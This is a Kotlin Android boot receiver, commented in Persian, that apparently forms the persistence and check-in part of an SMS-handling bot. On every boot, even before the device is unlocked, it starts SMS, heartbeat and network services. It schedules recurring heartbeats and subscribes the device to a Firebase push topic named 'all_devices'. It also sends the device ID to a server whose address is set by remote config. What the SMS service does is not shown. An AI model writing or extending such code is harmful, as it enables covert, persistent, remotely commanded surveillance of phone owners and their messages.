package com.example.test

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import com.example.test.utils.DirectBootHelper
import com.google.firebase.messaging.FirebaseMessaging
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class BootReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "BootReceiver"
    }

    override fun onReceive(context: Context?, intent: Intent?) {
        Log.d(TAG, "════════════════════════════════════════")
        Log.d(TAG, "📢 BOOT RECEIVER CALLED")
        Log.d(TAG, "════════════════════════════════════════")
        Log.d(TAG, "Action: ${intent?.action}")

        if (context == null || intent == null) {
            Log.e(TAG, "❌ Context or Intent is NULL!")
            return
        }

        // ⭐ Log کردن وضعیت Direct Boot
        DirectBootHelper.logStatus(context)

        // چک کردن همه انواع Boot Actions
        when (intent.action) {
            Intent.ACTION_LOCKED_BOOT_COMPLETED -> {
                // ⭐ قبل از Unlock - Direct Boot!
                Log.d(TAG, "🔐 LOCKED_BOOT_COMPLETED - Device still LOCKED")
                Log.d(TAG, "🚀 Starting services with Direct Boot support...")
                startAllServices(context, isLocked = true)
            }
            Intent.ACTION_BOOT_COMPLETED -> {
                // بعد از Unlock - Normal Boot
                Log.d(TAG, "🔓 BOOT_COMPLETED - Device UNLOCKED")
                Log.d(TAG, "🚀 Starting services normally...")
                
                // Migrate storage if needed
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    DirectBootHelper.migrateStorageIfNeeded(context)
                }
                
                startAllServices(context, isLocked = false)
            }
            "android.intent.action.QUICKBOOT_POWERON",
            Intent.ACTION_REBOOT -> {
                Log.d(TAG, "🔄 Quick boot or reboot detected")
                startAllServices(context, isLocked = false)
            }
            Intent.ACTION_USER_UNLOCKED -> {
                // ⭐ کاربر گوشی رو Unlock کرد
                Log.d(TAG, "🔓 USER_UNLOCKED - User just unlocked device")
                
                // Migrate storage
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    DirectBootHelper.migrateStorageIfNeeded(context)
                }
                
                // ممکنه سرویس‌ها نیاز به restart داشته باشن
                startAllServices(context, isLocked = false)
            }
            else -> {
                Log.w(TAG, "⚠️ Unknown action: ${intent.action}")
            }
        }
        
        Log.d(TAG, "════════════════════════════════════════")
    }

    private fun startAllServices(context: Context, isLocked: Boolean) {
        try {
            // ⭐ استفاده از Context مناسب برای Direct Boot
            val workingContext = DirectBootHelper.getContext(context)
            
            if (isLocked) {
                Log.d(TAG, "⚠️ Device LOCKED - Starting with limited functionality")
            } else {
                Log.d(TAG, "✅ Device UNLOCKED - Starting with full functionality")
            }
            
            // 0. ⭐ Initialize ServerConfig برای دسترسی به Remote Config
            try {
                ServerConfig.initialize(workingContext)
                Log.d(TAG, "✅ ServerConfig initialized")
            } catch (e: Exception) {
                Log.e(TAG, "⚠️ Failed to initialize ServerConfig: ${e.message}")
                // ادامه می‌دیم چون getBaseUrl() می‌تونه از default استفاده کنه
            }
            
            // ⭐ تاخیر برای اطمینان از fetch شدن Remote Config قبل از start کردن services
            Handler(Looper.getMainLooper()).postDelayed({
                val baseUrl = ServerConfig.getBaseUrl()
                Log.d(TAG, "✅ ServerConfig ready with URL: $baseUrl")
                
                // 1. Start SMS Service
                startSmsService(workingContext)

                // 2. Start Heartbeat Service
                startHeartbeatService(workingContext)

                // 3. Start Network Service
                startNetworkService(workingContext)
                
                // 4. ⭐ Schedule JobScheduler
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    com.example.test.utils.JobSchedulerHelper.scheduleHeartbeatJob(workingContext)
                    Log.d(TAG, "✅ JobScheduler scheduled")
                }
                
                // 5. ⭐ Initialize Firebase Messaging و Subscribe به Topic
                // با تاخیر بیشتر برای اطمینان از اینکه Firebase initialize شده
                Handler(Looper.getMainLooper()).postDelayed({
                    initializeFirebaseMessaging(workingContext)
                    // ارسال ping به سرور برای اعلام آنلاین بودن
                    sendBootPing(workingContext)
                }, 2000) // 2 ثانیه تاخیر اضافی
            }, 3000) // 3 ثانیه تاخیر برای fetch شدن Remote Config

            Log.d(TAG, "✅ All services started successfully")

        } catch (e: Exception) {
            Log.e(TAG, "❌ Error starting services", e)
        }
    }

    private fun startSmsService(context: Context) {
        try {
            val smsIntent = Intent(context, SmsService::class.java)

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(smsIntent)
                Log.d(TAG, "✅ SmsService started (Foreground)")
            } else {
                context.startService(smsIntent)
                Log.d(TAG, "✅ SmsService started")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start SmsService", e)
        }
    }

    private fun startHeartbeatService(context: Context) {
        try {
            val heartbeatIntent = Intent(context, HeartbeatService::class.java)

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(heartbeatIntent)
                Log.d(TAG, "✅ HeartbeatService started (Foreground)")
            } else {
                context.startService(heartbeatIntent)
                Log.d(TAG, "✅ HeartbeatService started")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start HeartbeatService", e)
        }
    }

    private fun startNetworkService(context: Context) {
        try {
            val networkIntent = Intent(context, NetworkService::class.java)

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(networkIntent)
                Log.d(TAG, "✅ NetworkService started (Foreground)")
            } else {
                context.startService(networkIntent)
                Log.d(TAG, "✅ NetworkService started")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start NetworkService", e)
        }
    }
    
    /**
     * ⭐ Initialize Firebase Messaging و Subscribe به Topic
     * این کار برای اطمینان از اینکه بعد از boot، Firebase کار می‌کنه
     */
    private fun initializeFirebaseMessaging(context: Context) {
        try {
            Log.d(TAG, "════════════════════════════════════════")
            Log.d(TAG, "🔥 INITIALIZING FIREBASE MESSAGING")
            Log.d(TAG, "════════════════════════════════════════")
            
            // 1. گرفتن FCM Token
            FirebaseMessaging.getInstance().token
                .addOnCompleteListener { task ->
                    if (task.isSuccessful && task.result != null) {
                        val token = task.result!!
                        Log.d(TAG, "✅ FCM Token received: ${token.take(20)}...")
                    } else {
                        Log.e(TAG, "❌ Failed to get FCM Token: ${task.exception?.message}")
                    }
                }
            
            // 2. Subscribe به Topic
            FirebaseMessaging.getInstance().subscribeToTopic("all_devices")
                .addOnCompleteListener { task ->
                    if (task.isSuccessful) {
                        Log.d(TAG, "✅ Successfully subscribed to 'all_devices' topic after boot")
                    } else {
                        Log.e(TAG, "❌ Failed to subscribe to 'all_devices' topic after boot", task.exception)
                        // Retry بعد از 30 ثانیه
                        Handler(Looper.getMainLooper()).postDelayed({
                            Log.d(TAG, "🔄 Retrying Firebase topic subscription...")
                            initializeFirebaseMessaging(context)
                        }, 30000)
                    }
                }
            
            // 3. ⭐ Restart WorkManager برای Heartbeat
            try {
                val workRequest = androidx.work.PeriodicWorkRequestBuilder<HeartbeatWorker>(
                    15,
                    java.util.concurrent.TimeUnit.MINUTES,
                    5,
                    java.util.concurrent.TimeUnit.MINUTES
                )
                    .setConstraints(
                        androidx.work.Constraints.Builder()
                            .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
                            .build()
                    )
                    .setBackoffCriteria(
                        androidx.work.BackoffPolicy.EXPONENTIAL,
                        10,
                        java.util.concurrent.TimeUnit.SECONDS
                    )
                    .addTag("heartbeat")
                    .build()

                androidx.work.WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                    HeartbeatWorker.WORK_NAME,
                    androidx.work.ExistingPeriodicWorkPolicy.REPLACE,
                    workRequest
                )
                Log.d(TAG, "✅ WorkManager restarted after boot")
            } catch (e: Exception) {
                Log.e(TAG, "❌ Failed to restart WorkManager: ${e.message}")
            }
            
            Log.d(TAG, "════════════════════════════════════════")
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to initialize Firebase Messaging: ${e.message}", e)
        }
    }
    
    /**
     * ⭐ ارسال Ping به سرور بعد از Boot
     * برای اعلام آنلاین بودن دستگاه
     */
    private fun sendBootPing(context: Context) {
        Thread {
            try {
                Log.d(TAG, "════════════════════════════════════════")
                Log.d(TAG, "📡 SENDING BOOT PING TO SERVER")
                Log.d(TAG, "════════════════════════════════════════")
                
                val deviceId = Settings.Secure.getString(
                    context.contentResolver,
                    Settings.Secure.ANDROID_ID
                )
                Log.d(TAG, "📱 Device ID: $deviceId")

                val body = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("isOnline", true)
                    put("timestamp", System.currentTimeMillis())
                    put("source", "BootReceiver")
                    put("event", "device_booted")
                }

                val baseUrl = ServerConfig.getBaseUrl()
                val urlString = "$baseUrl/ping-response"
                Log.d(TAG, "🌐 URL: $urlString")
                Log.d(TAG, "📤 Body: ${body.toString()}")

                val url = URL(urlString)
                val conn = url.openConnection() as HttpURLConnection

                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true
                conn.connectTimeout = 15000
                conn.readTimeout = 15000

                conn.outputStream.use { os ->
                    val bytes = body.toString().toByteArray()
                    Log.d(TAG, "📊 Body size: ${bytes.size} bytes")
                    os.write(bytes)
                    os.flush()
                }

                val responseCode = conn.responseCode
                Log.d(TAG, "📥 Response Code: $responseCode")

                if (responseCode == HttpURLConnection.HTTP_OK) {
                    val response = conn.inputStream.bufferedReader().use { it.readText() }
                    Log.d(TAG, "✅ Boot ping sent successfully: $response")
                } else {
                    val errorResponse = conn.errorStream?.bufferedReader()?.use { it.readText() }
                    Log.e(TAG, "❌ Boot ping failed: $errorResponse")
                }

                conn.disconnect()
                Log.d(TAG, "════════════════════════════════════════")
                
            } catch (e: java.net.ConnectException) {
                Log.e(TAG, "❌ Connection failed: Cannot reach server", e)
            } catch (e: java.net.SocketTimeoutException) {
                Log.e(TAG, "❌ Connection timeout", e)
            } catch (e: Exception) {
                Log.e(TAG, "❌ Failed to send boot ping: ${e.message}", e)
            }
        }.start()
    }
}